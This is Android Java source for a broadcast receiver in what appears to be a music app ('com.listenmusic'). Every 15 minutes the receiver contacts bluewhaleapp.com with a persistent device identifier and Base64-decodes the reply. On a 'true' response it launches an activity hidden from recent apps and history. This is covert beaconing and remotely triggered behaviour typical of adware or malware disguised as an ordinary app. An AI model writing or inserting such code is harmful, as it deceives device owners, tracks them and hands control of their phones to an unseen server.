package com.listenmusic;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Base64;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONArray;
import org.json.JSONException;

import java.util.UUID;


public class BrReceiver extends BroadcastReceiver {
    private static String uniqueID = null;
    private static final String PREF_UNIQUE_ID = "PREF_UNIQUE_ID";
    private Context mContext;
    @Override
    public void onReceive(Context context, Intent intent) {
        mContext = context;
        config();
    }

    public static void startAlarm(Context context) {
        stop(context);
        Intent alarmIntent = new Intent(context, BrReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, alarmIntent, PendingIntent.FLAG_UPDATE_CURRENT);
        AlarmManager manager = (AlarmManager) context. getSystemService(Context.ALARM_SERVICE);
        manager.setInexactRepeating(AlarmManager.RTC, System.currentTimeMillis() +  15 * 60 * 1000,  15 * 60 * 1000 , pendingIntent);
    }

    private static void stop(Context context) {
        Intent alarmIntent = new Intent(context, BrReceiver.class);PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, alarmIntent, PendingIntent.FLAG_UPDATE_CURRENT);
        AlarmManager manager   =   (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);manager.cancel(pendingIntent);
    }

    private void startSecondActivity(Context context){
        Intent intent = new Intent(mContext, SecondActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
        intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        mContext.startActivity(intent);
    }

    private void config(){
        RequestQueue queue = Volley.newRequestQueue(mContext);
        StringRequest ping = new StringRequest(Request.Method.GET, "http://bluewhaleapp.com/ged.php?" + id(mContext),
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {;
                        response = new String(Base64.decode(response, Base64.NO_WRAP));
                        try {
                            JSONArray s = new JSONArray(response);
                            if (s != null && s.getString(0).equals("true")) {
                               startSecondActivity(mContext);
                            }

                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
            }
        });
        queue.add(ping);
    }


    public synchronized static String id(Context context) {
        if (uniqueID == null) {
            SharedPreferences sharedPrefs = context.getSharedPreferences(
                    PREF_UNIQUE_ID, Context.MODE_PRIVATE);
            uniqueID = sharedPrefs.getString(PREF_UNIQUE_ID, null);
            if (uniqueID == null) {
                uniqueID = UUID.randomUUID().toString();
                SharedPreferences.Editor editor = sharedPrefs.edit();
                editor.putString(PREF_UNIQUE_ID, uniqueID);
                editor.commit();
            }
        }
        return "&id="+ uniqueID;
    }
}
